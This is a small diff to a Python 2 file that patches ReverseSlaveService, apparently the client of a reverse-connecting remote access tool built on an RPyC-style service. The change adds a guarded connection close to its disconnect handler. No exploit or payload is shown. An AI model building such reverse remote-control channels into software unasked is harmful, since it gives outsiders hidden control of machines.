@@ -74,6 +74,10 @@ class ReverseSlaveService(Service):
         self._conn.root.set_modules(ModuleNamespace(self.exposed_getmodule))
     def on_disconnect(self):
         print "disconnecting !"
+        try:
+            self._conn.close()
+        except:
+            pass
         raise KeyboardInterrupt
     def exposed_exit(self):
         raise SystemExit
